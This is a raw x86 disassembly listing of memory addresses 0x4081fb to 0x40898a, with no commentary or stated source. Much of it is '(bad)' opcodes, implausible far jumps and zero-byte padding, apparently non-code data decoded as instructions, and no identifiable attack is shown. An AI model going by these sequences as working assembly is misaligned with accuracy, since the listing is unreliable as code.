  4081fb:	jmp    FWORD PTR [esi+0x2a]
  4081fe:	ret    
  4081ff:	(bad)  
  408200:	cmp    ch,BYTE PTR [ecx-0x3d]
  408203:	inc    DWORD PTR [eax+eax*1]
  408206:	add    BYTE PTR [eax],al
  408208:	add    BYTE PTR [eax],al
  40820a:	clc    
  40820b:	and    edi,edi
  40820d:	add    DWORD PTR [ebx+0x24],esp
  408210:	call   DWORD PTR [ecx]
  408212:	inc    esp
  408213:	and    al,0xff
  408215:	adc    DWORD PTR [ebp+0x24],eax
  408218:	inc    DWORD PTR [ecx]
  40821a:	inc    esi
  40821b:	and    al,0xff
  40821d:	add    DWORD PTR [edi],esp
  40821f:	and    al,0xff
  408221:	shl    DWORD PTR [ecx],1
  408223:	and    al,0xff
  408225:	lds    eax,FWORD PTR [ecx]
  408227:	scas   al,BYTE PTR es:[edi]
  408228:	(bad)  
  408229:	fdiv   st(2),st
  40822b:	and    edi,edi
  40822d:	aad    0xc4
  40822f:	and    edi,edi
  408231:	add    BYTE PTR [edx+esi*2],ah
  408234:	(bad)  
  408235:	jmp    FWORD PTR [esi]
  408237:	jb     0x408238
  408239:	dec    DWORD PTR [esi]
  40823b:	add    al,BYTE PTR [edx]
  40823d:	add    bl,bh
  40823f:	add    DWORD PTR [edx],eax
  408241:	add    bl,dh
  408243:	add    DWORD PTR [edx],eax
  408245:	add    ah,dh
  408247:	sub    DWORD PTR [ecx],ecx
  408249:	and    dh,dl
  40824b:	sub    DWORD PTR [ecx],ecx
  40824d:	or     dl,dh
  40824f:	sub    DWORD PTR [ecx],ecx
  408251:	or     cl,BYTE PTR [edi+0x60]
  408254:	jno    0x4082bf
  408256:	cmp    al,0x53
  408258:	(bad)  
  408259:	push   edx
  40825b:	popa   
  40825c:	jb     0x4082ce
  40825e:	out    0xff,eax
  408260:	(bad)  
  408261:	call   FWORD PTR [esi+0x5d]
  408264:	jb     0x4082cf
  408266:	das    
  408267:	push   ds
  408268:	(bad)  
  408269:	dec    DWORD PTR [edx]
  40826b:	fs inc eax
  40826d:	add    BYTE PTR [eax],al
  40826f:	add    BYTE PTR [eax],al
  408271:	add    BYTE PTR [eax],al
  408273:	sbb    eax,0xe4004063
  408278:	sbb    al,BYTE PTR [ecx+0x0]
  40827b:	out    dx,eax
  40827c:	sbb    al,BYTE PTR [ecx+0x0]
  40827f:	out    dx,eax
  408280:	sbb    al,BYTE PTR [ecx+0x0]
  408283:	call   FWORD PTR [ecx]
  408285:	inc    ecx
  408286:	add    ah,al
  408288:	sbb    al,BYTE PTR [ecx+0x0]
  40828b:	sub    al,0x63
  40828d:	inc    eax
  40828e:	add    BYTE PTR [edx+eax*2+0x42a10040],bl
  408295:	inc    eax
  408296:	add    BYTE PTR [ecx],ah
  408298:	(bad)  
  408299:	(bad)  
  40829a:	(bad)  
  40829b:	cmp    BYTE PTR [edi+ecx*2],bh
  40829e:	push   edx
  40829f:	xchg   ebx,eax
  4082a0:	ss pop eax
  4082a2:	pop    edi
  4082a3:	pop    DWORD PTR [ecx+0x51]
  4082a6:	push   esi
  4082a7:	fst    DWORD PTR [eax+0x5e]
  4082aa:	dec    eax
  4082ab:	ror    DWORD PTR [edi+0x53],cl
  4082ae:	pop    edi
  4082af:	jne    0x4082a6
  4082b1:	add    eax,DWORD PTR [eax]
  4082b3:	jne    0x4082f7
  4082b5:	xchg   ebp,eax
  4082b6:	imul   edx,DWORD PTR [eax+0x2ffaf38],0xa553cf71
  4082c0:	cld    
  4082c1:	hlt    
  4082c2:	sub    eax,0x319a4
  4082c7:	jne    0x408332
  4082c9:	mov    dh,0x52
  4082cb:	dec    ecx
  4082cc:	sbb    DWORD PTR [ebx],eax
  4082ce:	add    BYTE PTR [ebp+0x54],dh
  4082d1:	rcl    BYTE PTR [ebx+0x75],0x67
  4082d5:	mov    ebp,0x41
  4082da:	add    BYTE PTR [eax],al
  4082dc:	xchg   ebp,eax
  4082dd:	imul   esi,ebx,0xf3699332
  4082e3:	xor    ch,BYTE PTR [edi+0x19]
  4082e6:	add    eax,DWORD PTR [eax]
  4082e8:	jne    0x408271
  4082ea:	mov    ebp,0x3195541
  4082ef:	add    BYTE PTR [ebp-0x17],dh
  4082f2:	add    esi,DWORD PTR [edx+0x75]
  4082f5:	mov    esp,0xc2756803
  4082fa:	add    esp,DWORD PTR [edx+0x75]
  4082fd:	rol    BYTE PTR [ebx],cl
  4082ff:	je     0x408376
  408301:	fld    QWORD PTR [ebx]
  408303:	push   esp
  408304:	jne    0x4082db
  408306:	add    eax,DWORD PTR [eax]
  408308:	jne    0x4082f2
  40830a:	add    ebp,DWORD PTR [ebp+esi*2-0x8]
  40830e:	add    esp,DWORD PTR [edx+0x75]
  408311:	or     al,BYTE PTR [esp+ebp*2]
  408314:	jne    0x4082ed
  408316:	add    eax,DWORD PTR [eax]
  408318:	jne    0x408319
  40831a:	add    ebp,DWORD PTR [edi+0x75]
  40831d:	or     al,0x4
  40831f:	popa   
  408320:	jne    0x408331
  408322:	add    al,0x5c
  408324:	jne    0x408351
  408326:	add    eax,DWORD PTR [eax]
  408328:	jne    0x4082d9
  40832a:	jne    0x40836d
  40832c:	jne    0x408330
  40832e:	fcom   DWORD PTR [ecx-0x3146fd4c]
  408334:	(bad)  
  408335:	leave  
  408336:	stos   DWORD PTR es:[edi],eax
  408337:	add    esi,DWORD PTR [ebp+0x2]
  40833a:	mov    ecx,0xb0c5a6c2
  40833f:	add    eax,DWORD PTR [eax]
  408341:	add    BYTE PTR [eax],al
  408343:	add    BYTE PTR [eax],al
  408345:	jne    0x408349
  408347:	xchg   esp,eax
  408348:	mov    ch,0xa7
  40834a:	mov    bh,0xaa
  40834c:	shl    BYTE PTR [edi],1
  40834e:	mov    ah,0x9f
  408350:	shl    DWORD PTR [ecx],0x2
  408353:	mov    edx,0xa9b534ce
  408358:	shr    DWORD PTR ds:0x7503abc4,1
  40835e:	add    bl,BYTE PTR [edi-0x5134d94c]
  408364:	retf   0x21c2
  408367:	lods   al,BYTE PTR ds:[esi]
  408368:	(bad)  
  408369:	daa    
  40836a:	(bad)  
  40836b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40836c:	shl    DWORD PTR [edi],1
  40836e:	retf   0x3e8
  408371:	jne    0x408375
  408373:	xor    al,0xbf
  408375:	inc    esp
  408376:	leave  
  408377:	and    eax,DWORD PTR [esi*2+0x39bc2a02]
  40837e:	lds    esp,FWORD PTR [ecx]
  408380:	mov    ch,0x21
  408382:	mov    dh,0xe8
  408384:	add    esi,DWORD PTR [ebp+0x2]
  408387:	sub    al,0xb9
  408389:	xor    eax,0xc8bb1cc5
  40838e:	retf   
  40838f:	adc    al,0xcb
  408391:	push   0x21
  408393:	cmp    edi,DWORD PTR [edi-0x2fc52e4e]
  408399:	pop    edx
  40839a:	and    DWORD PTR [esi+esi*4],edi
  40839d:	mov    esi,0x4ab929d1
  4083a2:	and    DWORD PTR [edx],ebx
  4083a4:	mov    edi,0xbc29b4b5
  4083a9:	add    BYTE PTR [eax],al
  4083ab:	add    BYTE PTR [eax],al
  4083ad:	add    BYTE PTR [edx],bh
  4083af:	and    DWORD PTR [eax],eax
  4083b1:	sbb    DWORD PTR [edi-0x30],eax
  4083b4:	dec    edi
  4083b5:	sbb    DWORD PTR [esi],esi
  4083b7:	mov    ch,0x42
  4083b9:	mov    cl,0x76
  4083bb:	add    al,BYTE PTR [eax]
  4083bd:	mov    ecx,0xaf4fd044
  4083c2:	iret   
  4083c3:	into   
  4083c4:	inc    ebx
  4083c5:	jmp    0xb4408640
  4083ca:	leave  
  4083cb:	mov    dh,0x44
  4083cd:	jmp    0xa4408648
  4083d2:	sub    eax,0x769d4ec4
  4083d7:	add    al,BYTE PTR [eax]
  4083d9:	mov    ch,0x29
  4083db:	les    ecx,FWORD PTR [edx-0x17]
  4083de:	jbe    0x4083e2
  4083e0:	add    BYTE PTR [edx-0x16a72ef7],ch
  4083e6:	jbe    0x4083ea
  4083e8:	add    BYTE PTR [ebp-0x5bbd3e5c],bl
  4083ee:	jbe    0x4083f2
  4083f0:	add    BYTE PTR [esi-0x61b74b3a],ah
  4083f6:	loopne 0x4083ab
  4083f8:	jmp    FWORD PTR [ecx]
  4083fa:	(bad)  
  4083fb:	into   
  4083fc:	dec    ebp
  4083fd:	and    al,0xb2
  4083ff:	mov    ah,0xff
  408401:	cmp    ah,cl
  408403:	mov    ah,0xff
  408405:	and    BYTE PTR [ecx+eax*8+0x276e943],bh
  40840c:	add    BYTE PTR ds:0x1d44ccac,ah
  408412:	add    BYTE PTR [eax],al
  408414:	add    BYTE PTR [eax],al
  408416:	add    BYTE PTR [eax+eiz*1],bh
  408419:	dec    DWORD PTR [edx+0x26]
  40841c:	scas   al,BYTE PTR es:[edi]
  40841d:	ins    DWORD PTR es:[edi],dx
  40841e:	or     al,0x1a
  408420:	xchg   esp,eax
  408421:	push   0xff20270e
  408426:	sbb    ebx,ebp
  408428:	mov    al,0x77
  40842a:	adc    BYTE PTR [ebp+eiz*4+0x6e],al
  40842e:	add    BYTE PTR [edx+0x54],ch
  408431:	arpl   WORD PTR fs:[eax+0x6f],ax
  408435:	outs   dx,BYTE PTR ds:[esi]
  408436:	outs   dx,BYTE PTR ds:[esi]
  408437:	sbb    al,0x4
  408439:	add    BYTE PTR [eax],al
  40843b:	jg     0x408490
  40843d:	ins    DWORD PTR es:[edi],dx
  40843e:	je     0x408471
  408440:	push   edx
  408441:	jae    0x408470
  408443:	sub    BYTE PTR [ebx+0x6d],ch
  408446:	xor    BYTE PTR [si-0x1],ch
  40844a:	jmp    DWORD PTR [eax]
  40844c:	jbe    0x4084ae
  40844e:	outs   dx,BYTE PTR ds:[esi]
  40844f:	mov    edi,0x69726469
  408454:	imul   ebp,DWORD PTR [ebp+0x63],0x6e6867bb
  40845b:	mov    bl,0x3
  40845d:	add    BYTE PTR [eax],al
  40845f:	add    DWORD PTR [esi+eiz*2+0x72],esi
  408463:	in     eax,dx
  408464:	addr16 fs add bh,bh
  408468:	imul   esi,DWORD PTR [esi+ebp*2-0x9],0x6a
  40846d:	arpl   WORD PTR [eax],ax
  40846f:	out    0x6a,eax
  408471:	fs jo  0x40841d
  408474:	imul   bp,WORD PTR [ecx+0x32],0x6a
  408479:	(bad)  
  40847a:	inc    DWORD PTR [eax]
  40847c:	add    BYTE PTR [eax],al
  40847e:	add    BYTE PTR [eax],al
  408480:	jmp    FWORD PTR [edi+0x6e]
  408483:	jae    0x4084b6
  408485:	push   es
  408486:	add    BYTE PTR [eax],al
  408488:	les    eax,FWORD PTR [eax+0x41]
  40848b:	add    bh,dl
  40848d:	lods   eax,DWORD PTR ds:[esi]
  40848e:	inc    eax
  40848f:	add    BYTE PTR [edx+0x5f0040b0],ch
  408495:	push   es
  408496:	cmp    al,BYTE PTR [eax]
  408498:	fs push es
  40849a:	dec    ebp
  40849b:	add    BYTE PTR [eax+0x67003b06],bl
  4084a1:	add    ecx,DWORD PTR [esi+0x0]
  4084a4:	sahf   
  4084a5:	push   es
  4084a6:	dec    esi
  4084a7:	add    BYTE PTR [ebx+0x75004e06],ah
  4084ad:	rol    DWORD PTR [ebx],1
  4084af:	cmp    esi,DWORD PTR [ebp+0x34]
  4084b2:	add    edi,DWORD PTR [ebx]
  4084b4:	jne    0x40848b
  4084b6:	add    edx,DWORD PTR [edi+0x75]
  4084b9:	xor    al,BYTE PTR [ebx]
  4084bb:	add    BYTE PTR [ebp+0x1c],dh
  4084be:	add    ebp,DWORD PTR [eax+0x75]
  4084c1:	push   es
  4084c2:	add    al,0x6c
  4084c4:	jne    0x4084fb
  4084c6:	add    esi,DWORD PTR [ebx]
  4084c8:	jne    0x4084c5
  4084ca:	add    ebp,DWORD PTR [esi]
  4084cc:	jne    0x40851b
  4084ce:	add    ebp,DWORD PTR [ebp+esi*2+0x5d]
  4084d2:	add    eax,DWORD PTR [eax]
  4084d4:	jne    0x408552
  4084d6:	retf   
  4084d7:	inc    esi
  4084d8:	nop
  4084d9:	push   ebp
  4084da:	into   
  4084db:	ins    DWORD PTR es:[edi],dx
  4084dc:	bound  esp,QWORD PTR [eax-0x4f]
  4084df:	inc    ebp
  4084e0:	pop    edx
  4084e1:	pop    ebp
  4084e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084e3:	add    BYTE PTR fs:[eax],al
  4084e6:	add    BYTE PTR [eax],al
  4084e8:	add    BYTE PTR [edi+0x59],ah
  4084eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084ec:	jae    0x40853b
  4084ee:	sub    DWORD PTR [ebx],eax
  4084f0:	add    BYTE PTR [ebp-0x6c],dh
  4084f3:	mov    ecx,0x45ce7541
  4084f8:	inc    ecx
  4084f9:	jne    0x4084c1
  4084fb:	inc    ebp
  4084fc:	inc    ecx
  4084fd:	jne    0x4084ea
  4084ff:	inc    ebp
  408500:	inc    ecx
  408501:	jne    0x4084b7
  408503:	mov    ecx,0x45ee7541
  408508:	inc    ecx
  408509:	jne    0x408563
  40850b:	dec    esi
  40850c:	inc    ecx
  40850d:	jne    0x408578
  40850f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408510:	inc    ecx
  408511:	jne    0x408529
  408513:	inc    eax
  408514:	inc    ecx
  408515:	jne    0x4084f7
  408517:	es inc ecx
  408519:	jne    0x4084f9
  40851b:	es inc ecx
  40851d:	jne    0x4084ee
  40851f:	add    esi,DWORD PTR [ebx+0x75]
  408522:	fild   DWORD PTR [ebx]
  408524:	jb     0x40859b
  408526:	pop    ss
  408527:	add    ebp,DWORD PTR [esi]
  408529:	jne    0x40852d
  40852b:	or     eax,0xd02c904
  408530:	add    al,0x75
  408532:	add    ah,ah
  408534:	or     eax,0x3e90878
  408539:	jne    0x40853d
  40853b:	mov    ecx,0xf30f6f0e
  408540:	add    esi,DWORD PTR [ebp+0x2]
  408543:	int3   
  408544:	fwait
  408545:	sub    bl,BYTE PTR [esi]
  408547:	fmul   QWORD PTR ds:0xe4230275
  40854d:	add    BYTE PTR [eax],al
  40854f:	add    BYTE PTR [eax],al
  408551:	add    BYTE PTR [edx],bl
  408553:	push   ds
  408554:	adc    eax,DWORD PTR [esi*2-0x7a4f21fe]
  40855b:	add    bl,BYTE PTR [ecx]
  40855d:	in     eax,dx
  40855e:	dec    edx
  40855f:	sar    esi,cl
  408561:	xchg   esi,eax
  408562:	xlat   BYTE PTR ds:[ebx]
  408564:	add    al,BYTE PTR [esi*2-0xa8987fe]
  40856b:	push   ebx
  40856c:	push   esi
  40856d:	ja     0x408573
  40856f:	xchg   DWORD PTR [ebx-0x73],edi
  408572:	or     al,0x8d
  408574:	jle    0x408501
  408576:	sbb    eax,0xf883608a
  40857b:	mov    esp,DWORD PTR [esi+0x69]
  40857e:	in     al,dx
  40857f:	jno    0x4085f3
  408581:	nop
  408582:	fld    QWORD PTR [eax+0x2f27661]
  408588:	xchg   ebx,eax
  408589:	mov    esi,0xc79ebc32
  40858e:	inc    ebx
  40858f:	add    al,0x2a
  408591:	into   
  408592:	sub    eax,0xae40bc02
  408597:	cmp    dl,dl
  408599:	sub    eax,0x13b6168b
  40859e:	cwde   
  40859f:	adc    DWORD PTR [ebx-0x4add75d5],ebx
  4085a5:	add    esi,DWORD PTR [ebp+0x2]
  4085a8:	add    BYTE PTR [ebp+ecx*4-0x476a18ef],bh
  4085af:	inc    ebx
  4085b0:	call   0xdb86326b
  4085b5:	mov    dh,0x0
  4085b7:	add    BYTE PTR [eax],al
  4085b9:	add    BYTE PTR [eax],al
  4085bb:	jbe    0x4085bf
  4085bd:	add    BYTE PTR [ebp+edi*4-0x676e2bbf],ch
  4085c4:	sbb    esi,eax
  4085c6:	xchg   ecx,eax
  4085c7:	pop    eax
  4085c8:	cs cld 
  4085ca:	lods   al,BYTE PTR ds:[esi]
  4085cb:	nop
  4085cc:	sub    eax,0x2c5a82ee
  4085d1:	repnz cwde 
  4085d3:	jbe    0x4085d7
  4085d5:	add    BYTE PTR ds:0x630e30f,cl
  4085db:	adc    al,0xa7
  4085dd:	fcom   QWORD PTR gs:[esi+edx*8]
  4085e1:	xor    ebp,ecx
  4085e3:	jbe    0x4085e7
  4085e5:	add    BYTE PTR [edi],cl
  4085e7:	clc    
  4085e8:	icebp  
  4085e9:	add    edi,esp
  4085eb:	out    0x1,eax
  4085ed:	pop    ss
  4085ee:	or     dl,cl
  4085f0:	or     ecx,DWORD PTR [esi]
  4085f2:	in     al,dx
  4085f3:	fisttp WORD PTR [ebx]
  4085f5:	sbb    edx,eax
  4085f7:	imul   esi,edx,0x765db39
  4085fd:	push   ss
  4085fe:	repz jnp 0x408600
  408601:	or     dl,ah
  408603:	fild   DWORD PTR [edx]
  408605:	or     esi,ecx
  408607:	cdq    
  408608:	loopne 0x408642
  40860a:	mov    dh,0x9a
  40860c:	sbb    al,0xff
  40860e:	jle    0x4085c8
  408610:	fcom   QWORD PTR [edx-0x6a]
  408613:	mov    dh,0xcc
  408615:	inc    ebp
  408616:	pop    ecx
  408617:	rol    ebx,1
  408619:	dec    ebx
  40861a:	inc    ebx
  40861b:	mov    ebx,0x3b43b9
  408620:	add    BYTE PTR [eax],al
  408622:	add    BYTE PTR [eax],al
  408624:	mov    al,0x1c
  408626:	call   edx
  408628:	pop    eax
  408629:	and    eax,0xe1a900e3
  40862e:	in     eax,0x0
  408630:	cmc    
  408631:	mov    ebx,0x89ebbda8
  408636:	mov    esp,0xa6bdf9aa
  40863b:	add    BYTE PTR [ebx],ch
  40863d:	jo     0x40869d
  40863f:	and    al,0x2a
  408641:	cmp    eax,0x3126205b
  408646:	dec    edi
  408647:	add    BYTE PTR [edi],cl
  408649:	in     al,dx
  40864a:	loope  0x408639
  40864c:	mov    ebx,0xb1d0ecdf
  408651:	in     eax,0xe8
  408653:	stc    
  408654:	hlt    
  408655:	cld    
  408656:	mov    edi,0xcec
  40865b:	add    dh,dh
  40865d:	mov    ds:0xb8eaa4a1,al
  408662:	mov    eax,0xbbace690
  408667:	add    BYTE PTR [ecx-0x2a],ah
  40866a:	fxch   st(1)
  40866c:	inc    ecx
  40866d:	fmul   st,st(1)
  40866f:	fsub   QWORD PTR [esi+0x3cf6fcd8]
  408675:	loop   0x408659
  408677:	(bad)  
  408678:	xor    al,0xf7
  40867a:	iret   
  40867b:	fisubr DWORD PTR [edi-0x17]
  40867e:	jmp    0x408666
  408680:	ins    DWORD PTR es:[edi],dx
  408681:	cli    
  408682:	mov    ds:0xc2db8acb,eax
  408687:	hlt    
  408688:	add    BYTE PTR [eax],al
  40868a:	add    BYTE PTR [eax],al
  40868c:	add    BYTE PTR [eax-0x4f],ah
  40868f:	fcom   st(3)
  408691:	adc    cl,0xdc
  408694:	retf   
  408695:	pop    ecx
  408696:	(bad)  
  408698:	fistp  DWORD PTR [edi+edi*8-0x73c10001]
  40869f:	test   DWORD PTR [eax-0x7d6b8010],ebx
  4086a5:	int    0x98
  4086a7:	test   BYTE PTR [ecx+0x32975],bl
  4086ad:	jne    0x408641
  4086af:	mov    WORD PTR [ecx-0x627a5712],ds
  4086b5:	aaa    
  4086b6:	mov    ds:0xd2758478,eax
  4086bb:	scas   al,BYTE PTR es:[edi]
  4086bc:	jge    0x4086a7
  4086be:	ficom  DWORD PTR [ecx+esi*1-0x6a1023]
  4086c5:	push   edx
  4086c6:	and    DWORD PTR [edx],0xfffffff0
  4086c9:	dec    ecx
  4086ca:	mov    dl,BYTE PTR [ecx]
  4086cc:	out    dx,al
  4086cd:	std    
  4086ce:	mov    WORD PTR [ebx],fs
  4086d0:	(bad)  
  4086d1:	jne    0x40865e
  4086d3:	adc    ebx,esp
  4086d5:	das    
  4086d6:	cwde   
  4086d7:	sbb    esi,ebx
  4086d9:	out    dx,al
  4086da:	xchg   ebx,eax
  4086db:	and    ebp,edi
  4086dd:	jne    0x408687
  4086df:	jne    0x408667
  4086e1:	cli    
  4086e2:	jg     0x408664
  4086e4:	cmp    cl,0xd9
  4086e7:	jns    0x40866e
  4086e9:	in     al,dx
  4086ea:	sub    BYTE PTR [ebx],al
  4086ec:	add    BYTE PTR [ebp-0x1d],dh
  4086ef:	ss int 0x0
  4086f2:	add    BYTE PTR [eax],al
  4086f4:	add    BYTE PTR [eax],al
  4086f6:	jmp    0x17d1:0x75c13de7
  4086fd:	(bad)  
  4086fe:	fld    st(0)
  408700:	sbb    eax,0x3dfbdcef
  408705:	clc    
  408706:	out    0xd,al
  408708:	sbb    al,0xe6
  40870a:	into   
  40870b:	or     eax,0xaaad51d
  408710:	and    ebp,ecx
  408712:	(bad)  
  408713:	hlt    
  408714:	adc    ebx,ebp
  408716:	mov    dh,0x16
  408718:	push   ss
  408719:	not    DWORD PTR [ebp+esi*8-0x1a3730b4]
  408720:	dec    edi
  408721:	aam    0xc6
  408723:	or     eax,0x1b0e32d
  408728:	rol    BYTE PTR [esi*2+0x5fa24602],0xe1
  408730:	add    dl,ah
  408732:	das    
  408733:	mov    ds:0xd54fe041,al
  408738:	inc    ebx
  40873a:	frstor [esi-0x1f600ff5]
  408740:	setb   cl
  408743:	fdiv   st,st(2)
  408745:	aam    0xc3
  408747:	xchg   esi,eax
  408748:	and    eax,0xbe393ec
  40874d:	(bad)  
  40874e:	mov    ch,0xf8
  408750:	out    dx,eax
  408751:	dec    edi
  408753:	ret    0xf421
  408756:	pop    ebx
  408757:	hlt    
  408758:	pop    es
  408759:	retf   0x0
  40875c:	add    BYTE PTR [eax],al
  40875e:	add    cl,al
  408760:	add    ecx,ebx
  408762:	rep stos DWORD PTR es:[edi],eax
  408764:	scas   al,BYTE PTR es:[edi]
  408765:	sbb    eax,0xf3f6820c
  40876a:	add    esi,DWORD PTR [ebp+0x2]
  40876d:	sbb    ebp,ebx
  40876f:	dec    esi
  408770:	jmp    0xd50b:0xcf45dcda
  408777:	add    bl,BYTE PTR [edx]
  408779:	xor    DWORD PTR [esi],esi
  40877b:	and    ecx,DWORD PTR [esi+0x23]
  40877e:	add    al,0x75
  408780:	add    ch,cl
  408782:	add    esi,DWORD PTR [ebp+0x2]
  408785:	out    0xf2,al
  408787:	jo     0x408793
  408789:	mov    dl,0x96
  40878b:	mov    ah,ch
  40878d:	out    0xe1,al
  40878f:	mov    ds:0x7006018e,al
  408794:	add    cl,BYTE PTR [ecx-0x5968a864]
  40879a:	ret    
  40879b:	jne    0x40877e
  40879d:	mov    esp,0xc59e33d1
  4087a2:	in     al,0x53
  4087a4:	jecxz  0x4087a5
  4087a6:	loop   0x40874c
  4087a8:	or     dh,BYTE PTR [ecx+0x78]
  4087ab:	mov    ebp,0x78fb1afb
  4087b0:	add    ebx,DWORD PTR [ecx+0x17]
  4087b3:	jne    0x4087a9
  4087b5:	push   ds
  4087b6:	loop   0x408831
  4087b8:	add    eax,0xa4d0380b
  4087bd:	sub    dh,cl
  4087bf:	jle    0x4087ce
  4087c1:	add    ecx,ebp
  4087c3:	add    BYTE PTR [eax],al
  4087c5:	add    BYTE PTR [eax],al
  4087c7:	add    BYTE PTR [eax+0x1],ah
  4087ca:	(bad)  
  4087cd:	(bad)  
  4087ce:	cmp    BYTE PTR [ecx+0x60],al
  4087d1:	hlt    
  4087d2:	pop    edx
  4087d3:	and    ecx,esi
  4087d5:	mov    eax,ds:0xdd131c70
  4087da:	pop    ebx
  4087db:	add    ebx,DWORD PTR [ecx]
  4087dd:	stos   DWORD PTR es:[edi],eax
  4087de:	ja     0x4087ea
  4087e0:	and    edx,ebp
  4087e2:	sub    al,0xfb
  4087e4:	jge    0x4087ef
  4087e6:	pop    esp
  4087e7:	iret   
  4087e8:	cmp    eax,0x1dd639be
  4087ed:	shl    DWORD PTR [eax],0xb8
  4087f0:	inc    ecx
  4087f1:	aam    0xff
  4087f3:	pop    eax
  4087f4:	pop    ecx
  4087f5:	daa    
  4087f6:	in     eax,0x45
  4087f8:	fs jg  0x408789
  4087fb:	bound  edx,QWORD PTR [edx+0x1d]
  4087fe:	out    0x4b,eax
  408800:	call   0xad6f4a2a
  408805:	and    al,0xc0
  408807:	das    
  408808:	aaa    
  408809:	cs (bad) 
  40880b:	pop    ss
  40880c:	mov    WORD PTR [ebp-0x29],cs
  40880f:	adc    ch,BYTE PTR ds:0x76e9c838
  408815:	add    al,BYTE PTR [eax]
  408817:	xchg   ecx,eax
  408818:	jmp    0xcd604aa
  40881d:	not    BYTE PTR ds:0x7ea3e2fa
  408823:	add    dh,dh
  408825:	push   cs
  408826:	jb     0x408885
  408828:	aad    0x45
  40882a:	pop    ebp
  40882b:	dec    ecx
  40882c:	add    BYTE PTR [eax],al
  40882e:	add    BYTE PTR [eax],al
  408830:	add    bh,cl
  408832:	inc    edx
  408833:	jl     0x408893
  408835:	clc    
  408836:	ds push ebx
  408838:	inc    ebx
  408839:	dec    edi
  40883a:	(bad)  
  40883b:	(bad)  
  40883c:	jmp    eax
  40883e:	mov    al,ds:0xb3eca1a8
  408843:	ror    dl,0xdb
  408846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408847:	mov    esi,0xa7c902a3
  40884c:	xchg   bh,bl
  40884e:	fwait
  40884f:	mov    ds:0x8283cd9d,al
  408854:	mov    al,ds:0x89988db9
  408859:	hlt    
  40885a:	mov    WORD PTR [eax],es
  40885c:	add    BYTE PTR [ebx+0x6f],bh
  40885f:	outs   dx,DWORD PTR ds:[esi]
  408860:	push   0xffffff91
  408862:	inc    edi
  408863:	jge    0x4088de
  408865:	ins    BYTE PTR es:[edi],dx
  408866:	fs jge 0x4088cb
  408869:	test   BYTE PTR [edi+0x75],cl
  40886c:	jl     0x4088e3
  40886e:	gs jl  0x4088ad
  408871:	or     al,0x4
  408873:	add    BYTE PTR [eax],al
  408875:	xchg   DWORD PTR [ebx+0x43],eax
  408878:	pop    esi
  408879:	sub    eax,0xc04d497d
  40887e:	dec    ebp
  40887f:	dec    ecx
  408880:	push   esi
  408881:	enter  0x4164,0x48
  408885:	fstp   DWORD PTR [edx+0x48]
  408888:	add    al,ah
  40888a:	xor    DWORD PTR [edi],ecx
  40888c:	add    ebx,esp
  40888e:	add    eax,DWORD PTR [eax]
  408890:	add    bl,bh
  408892:	mov    ds:0xa0b6,eax
  408897:	add    BYTE PTR [eax],al
  408899:	add    BYTE PTR [eax-0x61],ah
  40889c:	mov    dl,0xa5
  40889e:	das    
  40889f:	test   al,0xa7
  4088a1:	mov    edi,0xb89fb624
  4088a6:	jne    0x408874
  4088a8:	pop    edx
  4088a9:	mov    edx,0x8864d8ff
  4088ae:	not    BYTE PTR [esi+edi*2+0x7ac1d590]
  4088b5:	xchg   edi,eax
  4088b6:	icebp  
  4088b7:	(bad)  
  4088b8:	bound  ebp,QWORD PTR [ecx-0x5d9724ff]
  4088be:	fcomp  DWORD PTR [ebp+0x58]
  4088c1:	mov    ds:0x1c90cb,al
  4088c6:	jne    0x4088ba
  4088c8:	in     eax,0x32
  4088ca:	push   edx
  4088cb:	mov    esp,0xedab33e3
  4088d0:	cdq    
  4088d1:	cmp    ch,BYTE PTR [eax-0x22b530f8]
  4088d7:	or     ah,bl
  4088d9:	xor    al,al
  4088db:	out    dx,al
  4088dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088dd:	es xchg esp,eax
  4088df:	and    al,0xb8
  4088e1:	pop    esi
  4088e2:	fld    DWORD PTR [edi-0x2b]
  4088e5:	mov    WORD PTR cs:[ecx+esi*4],gs
  4088e9:	(bad)  
  4088ea:	cmp    ch,BYTE PTR [ecx]
  4088ec:	add    eax,DWORD PTR [eax]
  4088ee:	jne    0x40892a
  4088f0:	leave  
  4088f1:	and    edx,DWORD PTR [edi-0xa]
  4088f4:	int    0xc
  4088f6:	jbe    0x408911
  4088f8:	add    eax,0xff20a40e
  4088fd:	inc    DWORD PTR [eax]
  4088ff:	add    BYTE PTR [eax],al
  408901:	add    BYTE PTR [eax],al
  408903:	stos   DWORD PTR es:[edi],eax
  408904:	add    dl,bl
  408906:	xor    bh,BYTE PTR [edi-0x6dee06bc]
  40890c:	sbb    al,0xf8
  40890e:	pop    edi
  40890f:	gs push cs
  408911:	test   BYTE PTR [ebp-0x75],0x27
  408915:	add    esp,DWORD PTR [eax+0x5b]
  408918:	or     BYTE PTR [edi-0x6ea6a78c],ch
  40891e:	and    BYTE PTR [edi-0x66d96ef5],dl
  408924:	add    ah,BYTE PTR [ebp-0x2270a670]
  40892a:	popf   
  40892b:	jb     0x40891d
  40892d:	xchg   edx,eax
  40892e:	pop    DWORD PTR [ebp+0x189a7d8d]
  408934:	mov    ds:0xfb3ecbb1,al
  408939:	stos   DWORD PTR es:[edi],eax
  40893a:	leave  
  40893b:	ins    BYTE PTR es:[edi],dx
  40893c:	add    ebx,esi
  40893e:	or     BYTE PTR [esi+edi*8],dh
  408941:	call   0xd842fe49
  408946:	adc    BYTE PTR [esi-0x76a91feb],cl
  40894c:	fcom   QWORD PTR es:[edx]
  40894f:	jne    0x408953
  408951:	pop    ds
  408952:	mov    al,0xc4
  408954:	lods   al,BYTE PTR ds:[esi]
  408955:	sbb    bl,cl
  408957:	mov    DWORD PTR [edx],0x57c0ce3
  40895d:	loope  0x408964
  40895f:	jns    0x40895d
  408961:	fsubp  st(7),st
  408963:	adc    ah,0x28
  408966:	icebp  
  408967:	add    BYTE PTR [eax],al
  408969:	add    BYTE PTR [eax],al
  40896b:	add    BYTE PTR [edi+0x77c82fc1],cl
  408971:	fbstp  TBYTE PTR [eax]
  408973:	enter  0xfcb3,0x2d
  408977:	(bad)  
  408978:	ja     0x408969
  40897a:	call   0x2442fe82
  40897f:	mov    edi,0xcc18c1b9
  408984:	mov    DWORD PTR [edx],0xfa7903ae
  40898a:	add    BYTE PTR [eax],cl
